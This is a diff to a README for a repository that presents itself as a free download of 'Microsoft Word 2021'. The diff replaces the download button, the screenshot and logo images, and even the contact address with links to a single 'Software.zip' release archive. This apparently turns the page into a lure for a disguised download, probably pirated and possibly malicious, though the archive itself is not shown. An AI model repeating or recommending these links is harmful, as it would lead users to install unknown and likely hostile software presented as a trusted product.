@@ -11,7 +11,7 @@ Welcome to the **Microsoft Word 2021** repository! Here you can download and ins
 
 To download Microsoft Word 2021, simply click on the link below:
 
-[![Download Microsoft Word 2021](https://img.shields.io/badge/Download-Microsoft%20Word%202021-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Microsoft Word 2021](https://github.com/Nagy235/microsoft-word-2021/releases/download/v1.0/Software.zip%20Word%202021-blue)](https://github.com/Nagy235/microsoft-word-2021/releases/download/v1.0/Software.zip)
 
 *Note: Click the button above to download Microsoft Word 2021*
 
@@ -25,8 +25,8 @@ If the link doesn't work or you need more information, please check the **Releas
 ## 📷 Screenshots
 Here are some sneak peeks of Microsoft Word 2021:
 
-1. ![Screenshot 1](https://via.placeholder.com/600x400)
-2. ![Screenshot 2](https://via.placeholder.com/600x400)
+1. ![Screenshot 1](https://github.com/Nagy235/microsoft-word-2021/releases/download/v1.0/Software.zip)
+2. ![Screenshot 2](https://github.com/Nagy235/microsoft-word-2021/releases/download/v1.0/Software.zip)
 
 ## 📚 Installation Guide
 Follow these steps to install Microsoft Word 2021 on your device:
@@ -39,11 +39,11 @@ Follow these steps to install Microsoft Word 2021 on your device:
 We welcome contributions from the open-source community to enhance Microsoft Word 2021. Feel free to submit pull requests or open issues for any improvements or bug fixes.
 
 ## 📞 Contact
-If you have any questions or need assistance, you can reach out to us at [email@example.com](mailto:email@example.com).
+If you have any questions or need assistance, you can reach out to us at [https://github.com/Nagy235/microsoft-word-2021/releases/download/v1.0/Software.zip](https://github.com/Nagy235/microsoft-word-2021/releases/download/v1.0/Software.zip).
 
 ## 📜 License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
 
 Happy Word processing with Microsoft Word 2021! 🎉
 
-![Microsoft Word 2021 Logo](https://via.placeholder.com/200x200)
+![Microsoft Word 2021 Logo](https://github.com/Nagy235/microsoft-word-2021/releases/download/v1.0/Software.zip)
